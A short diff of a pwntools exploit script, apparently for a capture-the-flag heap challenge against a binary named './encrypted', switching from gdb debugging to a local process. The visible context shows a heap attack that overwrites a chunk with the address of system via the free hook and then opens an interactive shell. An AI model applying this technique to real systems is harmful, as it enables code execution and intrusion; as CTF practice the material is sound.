@@ -14,14 +14,14 @@ continue
 #     print(link)
 # print(elf.sym.__libc_system) 
 # print(elf.sym.__free_hook)
-pwn.context.terminal = ['tmux', 'splitw', '-h']
+# pwn.context.terminal = ['tmux', 'splitw', '-h']
 binaryname = "./encrypted"
 
 #p=process(binaryname)
 #p=remote("207.154.239.148", 1369)
-p=pwn.gdb.debug(binaryname, gdbscript=gs)
+# p=pwn.gdb.debug(binaryname, gdbscript=gs)
 # p=pwn.gdb.debug(binaryname)
-# p=pwn.process(binaryname)
+p=pwn.process(binaryname)
 #gdb.attach(p)
 
 def malloc(ind, size):
@@ -107,6 +107,5 @@ malloc(10, 24)
 malloc(11, 24)
 edit(11, pwn.p64(system_address))
 free(3)
-
 
 p.interactive()
